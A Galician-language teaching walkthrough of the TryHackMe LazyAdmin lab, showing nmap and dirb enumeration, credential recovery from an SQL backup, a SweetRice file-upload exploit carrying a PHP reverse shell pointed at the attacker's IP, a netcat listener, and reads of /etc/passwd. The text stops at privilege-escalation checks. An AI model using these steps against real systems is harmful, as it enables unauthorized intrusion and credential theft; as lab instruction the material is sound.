+  <span class="md-ellipsis">
+    HackTheBox
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackthebox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-hackthebox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_6" id="__nav_3_2_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    VulNyx
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            VulNyx
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vulnyx/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-vulnyx/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hacksplaining/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    HackSplaining
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_8" id="__nav_3_2_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    picoCTF
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_8">
+            <span class="md-nav__icon md-icon"></span>
+            picoCTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../picoctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-picoctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_9" id="__nav_3_2_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    PentesterLab
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_9">
+            <span class="md-nav__icon md-icon"></span>
+            PentesterLab
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pentesterlab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../practicas-taller-pentesterlab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../machine-owasp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OWASP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../s4vitar/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    S4vitar
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#obxectivo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Obxectivo
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pasos-basicos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pasos básicos
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fases-dun-test-de-intrusion-pentest" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fases dun test de intrusión (Pentest)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Fases dun test de intrusión (Pentest)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fase-1-recopilacion-de-informacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 1: Recopilación de información
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Fase 1: Recopilación de información">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-1-acceder-mediante-attackbox" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 1. Acceder mediante AttackBox
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-2-acceder-mediante-vpn" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 2. Acceder mediante VPN
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fase-2-analise-de-vulnerabilidades" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 2: Análise de vulnerabilidades
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fase-3-explotacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 3: Explotación
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fase-4-post-explotacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 4: Post-explotación
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fase-5-persistencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 5: Persistencia
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Fase 5: Persistencia">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#engadir-usuario-permanente-e-ademais-facelo-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      Engadir usuario permanente e ademais facelo root
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fase-6-informe-final" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fase 6: Informe final
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="practica-taller-lazyadmin-tryhackme-pentest-completo-paso-a-paso">Práctica Taller: LazyAdmin (TryHackMe) – Pentest completo paso a paso</h1>
+<div class="admonition warning">
+<p class="admonition-title"><strong>De interese</strong></p>
+<ul>
+<li>Ás <code>rooms</code> pódese acceder mediante <code>AttackBox</code> ou <code>VPN</code>. <br />
+<img alt="Fig. AttackBox ou VPN" src="../images/access-tryhackme.png" />   </li>
+<li>As contas <strong>Free</strong> soamente poderán iniciar o <strong><code>AttackBox</code> gratuíto unha hora ao día</strong>. Debes abonarte para acceso ilimitado a AttackBox.</li>
+<li>Se se accede por <code>AttackBox</code> xa conectas dende o propia navegador a unha máquina atacante, con moitas ferramentas preinstaladas, a cal posúe conectividade coa máquina vítima(room).</li>
+<li>Se se accede por <code>VPN</code> debes configurar a túa propia máquina para o ataque e conectar dende ela, por VPN, á máquina vítima(room).  </li>
+<li>Usa a máquina desta <code>room</code> como práctica inicial antes de abordar máquinas máis complexas.   </li>
+</ul>
+</div>
+<h3 id="obxectivo">Obxectivo</h3>
+<p>Realizar un test de intrusión completo (6 fases) sobre a máquina, desde enumeración ata explotación, persistencia e redacción do informe.</p>
+<hr />
+<h3 id="pasos-basicos">Pasos básicos</h3>
+<ol>
+<li>
+<p>Configurar en VirtualBox unha máquina <strong>Kali Linux</strong> coa rede en modo <strong>NAT</strong>.  <br />
+<img alt="Fig. Configuración en VirtualBox" src="../images/detalles-virtualbox-kali-nat.png" width="75%" /></p>
+</li>
+<li>
+<p>Arrancar a máquina Kali Linux:  </p>
+<ul>
+<li>Acceder a <a href="https://tryhackme.com/room/lazyadmin" target="_blank">TryHackMe</a> e facer clic en <code>Join Room</code> </li>
+<li>Arrancar a máquina facendo clic en <code>Start Machine</code>    </li>
+<li>Picar na icona de interrogación para saber como acceder á máquina unha vez obtida a IP.    </li>
+<li>Detectar vulnerabilidades en servizos e/ou aplicacións.  </li>
+<li>Explorar un vector de ataque e conseguir acceso ao sistema.</li>
+<li>Recoller información do sistema.</li>
+<li>Conseguir contido ficheiro <code>user.txt</code></li>
+<li>Elevación de privilexios e conseguir acceso coma root.</li>
+<li>Conseguir contido ficheiro <code>root.txt</code></li>
+</ul>
+</li>
+<li>Elaborar un informe final coas evidencias obtidas.</li>
+</ol>
+<hr />
+<h2 id="fases-dun-test-de-intrusion-pentest">Fases dun test de intrusión (Pentest)</h2>
+<p><img alt="Fig. Fases Pentest" src="../images/fases6_white_background.png" width="75%" />  </p>
+<hr />
+<h3 id="fase-1-recopilacion-de-informacion">Fase 1: Recopilación de información</h3>
+<div class="admonition warning">
+<p class="admonition-title"><strong>Prerrequisito</strong></p>
+<p>Arrancar a máquina Kali Linux na primeira opción de arranque.</p>
+</div>
+<ol>
+<li>
+<p>Acceder a <a href="https://tryhackme.com/room/lazyadmin" target="_blank">LazyAdmin - TryHackMe</a> e facer clic en <code>Join Room</code>:  <br />
+<img alt="Fig. LazyAdmin - Join Room" src="../images/lazyadmin1.png" /></p>
+</li>
+<li>
+<p>Arrancar a máquina facendo clic en <code>Start Machine</code>:  <br />
+<img alt="Fig. LazyAdmin - Start Machine" src="../images/lazyadmin2.png" /></p>
+</li>
+<li>
+<p>Picar na icona de interrogación para saber como acceder á máquina unha vez obtida a IP:  <br />
+<img alt="Fig. LazyAdmin - Info para acceder" src="../images/lazyadmin3.png" />    </p>
+</li>
+</ol>
+<h4 id="opcion-1-acceder-mediante-attackbox">Opción 1. Acceder mediante AttackBox</h4>
+<ol>
+<li>
+<p>Picar en Start AttackBox e esperar a que apareza a máquina:  <br />
+<img alt="Fig. LazyAdmin - Info para acceder" src="../images/lazyadmin4.png" />
+    <img alt="Fig. LazyAdmin - Info para acceder" src="../images/lazyadmin5.png" />
+    <img alt="Fig. LazyAdmin - Info para acceder" src="../images/lazyadmin6.png" /></p>
+</li>
+<li>
+<p>Logo, proceder de forma análoga a partir da <code>Opción 2 - apartado D</code>.</p>
+</li>
+</ol>
+<h4 id="opcion-2-acceder-mediante-vpn">Opción 2. Acceder mediante VPN</h4>
+<p>A. Picar en <code>See Instructions</code>:  <br />
+<img alt="Fig. LazyAdmin - Info para acceder" src="../images/access-tryhackme-vpn.png" />  <br />
+B. Picar en <code>Download configuration file</code>:  <br />
+<img alt="Fig. LazyAdmin - Info para acceder" src="../images/access-tryhackme-vpn2.png" />    </p>
+<div class="admonition tip">
+<p class="admonition-title">Se se descarga por primeira vez</p>
+<p>Picar de novo <code>Download configuration file</code> para descargar o ficheiro de configuración VPN.    </p>
+</div>
+<p>C. Unha vez descargado o ficheiro <code>.vpn</code> correspondente ao teu usuario abrir unha consola e executar:   </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>setxkbmap<span class="w"> </span>es
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>sudo<span class="w"> </span>openvpn<span class="w"> </span>username.vpn
+</span></code></pre></div>
+<div class="admonition note">
+<p class="admonition-title"><code>sudo openvpn username.vpn</code></p>
+<p>Lanza o cliente OpenVPN usando o ficheiro de configuración <code>username.vpn</code>. O que sucede en concreto:</p>
+<ul>
+<li><code>sudo</code> — require permisos de root para crear a interface de rede virtual (tun0) e modificar táboas de ruteo.    </li>
+<li><code>openvpn username.vpn</code> — OpenVPN le o ficheiro <code>.vpn</code> (contén certificado/clave, servidor, portas, rutas, DNS, etc.) e establece a conexión coa infraestrutura de TryHackMe.    </li>
+<li>Ao conectar: créase unha interface <code>tun0</code> (ou similar), aplícanse rutas e DNS proporcionadas polo servidor, e o teu tráfico cara ás IPs do lab pasa pola VPN.    </li>
+<li>Resultado práctico: podes executar <code>ping</code>, <code>nmap</code> e acceder (ssh, web, etc.) ás máquinas da room como se estiveseches na mesma rede do lab.    </li>
+<li>Comprobación rápida noutra consola: <code>ip a</code> (ver <code>tun0</code>) e <code>ip route</code> / <code>ping &lt;IP-da-machine&gt;</code> para asegurarte de conectividade.    </li>
+<li>Para deter a conexión VPN: <code>Ctrl+C</code> na terminal onde corre OpenVPN (ou mata o proceso).</li>
+</ul>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Aviso/boas prácticas</p>
+<p>Non deixes a VPN activa cando non a uses. <br />
+Usa isto só para labs autorizados (TryHackMe/CTF). </p>
+</div>
+<p>D. Comprobación de conectividade e detección do sistema operativo. Así, executar na anterior consola:</p>
+<div class="admonition note">
+<p class="admonition-title">IP de TryHackMe servida para esta máquina</p>
+<p>No caso de execución deste procedemento a IP servida foi: <strong>10.10.127.68</strong>, pero no voso caso pode variar. Tédeo en conta para o seguimento desta práctica.</p>
+</div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ping<span class="w"> </span>-c1<span class="w"> </span><span class="m">10</span>.10.127.68<span class="w"> </span>-R
+</span></code></pre></div>
+<div class="admonition note">
+<p class="admonition-title">TTL</p>
+<ul>
+<li>TTL ≃ 64 ⇒ GNU/Linux  </li>
+<li>TTL ≃ 128 ⇒ Microsoft Windows<br />
+Como podemos observar na saída do comando <code>ping</code> estamos ante unha máquina obxectivo GNU/Linux.
+<img alt="Fig. TTL" src="../images/lazyadmin-ping-ttl.png" />    </li>
+</ul>
+</div>
+<p>E. Escaneo básico con Nmap:</p>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-vvv<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.10.127.68
+</span></code></pre></div>
+    <img alt="Fig. Recoñecemento con nmap" src="../images/lazyadmin-nmap-1.png" />    </p>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-oA<span class="w"> </span>lazyadmin-scan<span class="w"> </span><span class="m">10</span>.10.127.68
+</span></code></pre></div>
+    <img alt="Fig. Numeración de servizos e versións" src="../images/lazyadmin-nmap-2.png" />    </p>
+<h3 id="fase-2-analise-de-vulnerabilidades">Fase 2: Análise de vulnerabilidades</h3>
+<p>Identificación de servizos vulnerábeis:</p>
+<ul>
+<li>Servizos atopados: SSH e Apache</li>
+</ul>
+<p>Dende a máquina Kali GNU/Linux emprega varias ferramentas para obter información:  <br />
+- <code>whatweb</code> é unha ferramenta de fingerprinting web que identifica tecnoloxías, cabeceras e versións dun servidor HTTP a partir dunha URL ou enderezo IP.
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>whatweb<span class="w"> </span><span class="m">10</span>.10.127.68
+</span></code></pre></div>
+<img alt="Fig. whatweb IP" src="../images/lazyadmin-whatweb.png" />  <br />
+- <code>dirb</code> é unha ferramenta de descubrimento de directorios/ficheiros web que usa wordlists para forzar URLs e localizar rutas ocultas nun servidor HTTP.
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>dirb<span class="w"> </span>http://10.10.127.68
+</span></code></pre></div>
+<img alt="Fig. dirb IP" src="../images/lazyadmin-dirb.png" />  <br />
+Con esta ferramenta atopamos rutas no servidor que podemos explorar, como: <strong>http://10.10.127.68/content/</strong><br />
+Así, visitando esa URL no navegador atopamos a aplicación SweetRice.  <br />
+<img alt="Fig. firefox http://IP/content/" src="../images/lazyadmin-content.png" />  <br />
+Tamén poderiamos executar de novo o comando <code>whatweb</code> nesa URL:  <br />
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>whatweb<span class="w"> </span>http://10.10.127.68/content/
+</span></code></pre></div>
+<img alt="Fig. whatweb http://IP/content/" src="../images/lazyadmin-whatweb-content.png" />  <br />
+Voltamos a executar de novo o comando <code>dirb</code> sobre esa URL para seguir descubrindo directorios/ficheiros atopando, entre outras, as seguintes URLs: <br />
+1. http://10.10.127.68/content/as/ -&gt; Atopamos o panel de login da aplicación SweetRice
+<img alt="Fig. Panel de Login" src="../images/lazyadmin-panel-login.png" width="75%" />  <br />
+2. http://10.10.127.68/content/inc/ -&gt; Atopamos un directorio <code>interesante</code> de backups. <br />
+<img alt="Fig. Directorio de backups" src="../images/lazyadmin-backups.png" />  <br />
+3. http://10.10.127.68/content/inc/mysql_backup/ -&gt; Atopamos un ficheiro de backup de sql, o cal descargamos.  <br />
+<img alt="Fig. Ficheiro backup" src="../images/lazyadmin-backup-file.png" />  <br />
+Ao descargar ese ficheiro, buscamos se podemos obter credenciais:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s1">&#39;admin/passwd&#39;</span><span class="w"> </span>mysql_bakup_20191129023059-1.5.1.sql
+</span></code></pre></div>
+Atopamos as seguintes credenciais:  <br />
+<strong>Usuario admin</strong>: manager  <br />
+<strong>Password</strong>: Password123  <br />
+<img alt="Fig. Credenciais atopadas" src="../images/lazyadmin-credenciais.png" />  <br />
+Accedemos ao panel de login da ferramenta, introducimos as credenciais e estamos dentro da aplicación.  <br />
+<img alt="Fig. Login: manager/Password123" src="../images/lazyadmin-login.png" width="75%" />  <br />
+Se observamos no panel esquerdo vemos a versión desta aplicación: <strong>1.5.1</strong>   <br />
+<img alt="Fig. SweetRice - version 1.5.1" src="../images/lazyadmin-sweetrice-version.png" />  <br />
+- <code>searchsploit</code> para buscar exploits relacionados con sweetrice: 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>searchsploit<span class="w"> </span>sweetrice
+</span></code></pre></div>
+<img alt="Fig. content" src="../images/lazyadmin-searchsploit-sweetrice.png" />    </p>
+<div class="admonition info">
+<p class="admonition-title">Exploits atopados</p>
+<p>Podemos observar que atopamos varios exploits para a versión 1.5.1, sendo a principio moi interesante o de <code>File Upload</code>. Lemos o contido do ficheiro <code>40716.py</code> co seguinte comando para estudar este exploit:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>searchsploit -x 40716.py
+</span></code></pre></div>
+Unha vez estudado este exploit continuamos coa fase de Explotación.  <br />
+Tamén podemos descargar este exploit á ruta local mediante o comando:  <br />
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>searchsploit -m 40716.py
+</span></code></pre></div></p>
+</div>
+<hr />
+<h3 id="fase-3-explotacion">Fase 3: Explotación</h3>
+<p>Estudando o contido do exploit para esa aplicación atopamos que é vulnerable á subida de arquivos php5 na xeración de Post, entón:    </p>
+<ul>
+<li>
+<p>Descargamos unha reverse shell php de: <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">GitHub pentestmonkey</a> </p>
+</li>
+<li>
+<p>Modificamos a extensión a php5 e no contido do ficheiro a IP e o porto a escoitar a reverse shell    </p>
+</li>
+</ul>
+<div class="admonition note">
+<p class="admonition-title">IP da máquina Kali Linux</p>
+<p>No caso de execución deste procedemento a IP da máquina Kali Linux foi: <strong>10.9.1.180</strong>, pero no voso caso pode variar. Tédeo en conta para o seguimento desta práctica.
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>$<span class="w"> </span>ip<span class="w"> </span>-o<span class="w"> </span>-4<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>eth0<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $4}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39;/&#39;</span><span class="w"> </span>-f1
+</span></code></pre></div></p>
+</div>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>cp<span class="w"> </span>-pv<span class="w"> </span>php-reverse-shell.php<span class="w"> </span>shell.php5
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>grep<span class="w"> </span>-i<span class="w"> </span>change<span class="w"> </span>shell.php5
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>ip<span class="w"> </span>-o<span class="w"> </span>-4<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>tun0<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $4}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39;/&#39;</span><span class="w"> </span>-f1
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>sed<span class="w"> </span>-i<span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;s|=&#39;127.0.0.1&#39;|=&#39;10.9.1.180&#39;|&quot;</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;s/= 1234/= 4444/&#39;</span><span class="w"> </span>shell.php5
+</span></code></pre></div>
+<img alt="Fig. content" src="../images/lazyadmin-shell-php-pentestmonkey.png" />    </p>
+<ul>
+<li>
+<p>Accedemos a Post -&gt; Create  <br />
+<img alt="Fig. content" src="../images/lazyadmin-post-create.png" />        </p>
+</li>
+<li>
+<p>Subimos ese arquivo php5, que será accesible en http://10.10.127.68/content/attachments/shell.php5  <br />
+<img alt="Fig. content" src="../images/lazyadmin-add-file.png" width="75%" />       <br />
+<img alt="Fig. content" src="../images/lazyadmin-add-file-upload.png" />  <br />
+<img alt="Fig. content" src="../images/lazyadmin-add-file-upload-path.png" />    </p>
+</li>
+<li>
+<p>Abrimos outra consola en Kali Linux e pomos o porto TCP anterior en escoita para recoller a shell da máquina vítima:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>nc<span class="w"> </span>-nlvp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p>No navegador accedemos a  http://10.10.127.68/content/attachments/shell.php5
+<img alt="Fig. content" src="../images/lazyadmin-reverse-shell.png" />    </p>
+</li>
+<li>
+<p>Agora, obtemos na consola anterior a reverse shell, na cal facemos un tratamento tty para convertir esta consola nun terminal similar ao que obteriamos se accederamos como usuario a este sistema:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>script<span class="w"> </span>/dev/null<span class="w"> </span>-c<span class="w"> </span>bash
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Ctrl+Z
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="nb">fg</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>reset
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>xterm
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="nb">export</span><span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>bash
+</span></code></pre></div></p>
+</li>
+</ul>
+<div class="admonition tip">
+<p class="admonition-title">De interese</p>
+<p><a href="https://s4vitar.github.io/oscp-preparacion/#pentesting-linux" target="_blank">https://s4vitar.github.io/oscp-preparacion/#pentesting-linux</a></p>
+</div>
+<h3 id="fase-4-post-explotacion">Fase 4: Post-explotación</h3>
+<p>Recolleita de información (datos sensibles):  <br />
+Dende a consola aberta a través de <em>nc</em> podemos ir recopilando información.</p>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>whoami
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>uname<span class="w"> </span>-a
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>cat<span class="w"> </span>/etc/passwd
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>ls<span class="w"> </span>-l<span class="w"> </span>/home
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>ls<span class="w"> </span>-lahtr<span class="w"> </span>/home/itguy
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>cat<span class="w"> </span>/home/itguy/user.txt
+</span></code></pre></div>
+<strong>Xa obtemos a flag user.txt</strong></p>
+<p>Seguimos:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>cat<span class="w"> </span>/home/itguy/backup.pl
